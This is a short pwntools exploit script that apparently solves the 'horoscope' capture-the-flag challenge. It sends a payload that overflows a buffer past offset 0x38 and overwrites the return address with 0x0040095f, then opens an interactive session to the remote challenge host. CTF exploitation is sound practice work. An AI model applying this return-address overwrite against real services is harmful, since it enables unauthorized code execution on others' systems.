from pwn import *

exe = ELF("./horoscope")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("horoscope.sdc.tf",1337)

    return r

io = conn()
if args.R2:
    input("asd")
io.sendlineafter(b"own horoscope\n",flat({
    0:b"01/01/2001/1234\x00",
    0x30+8:0x0040095f
}))
io.interactive()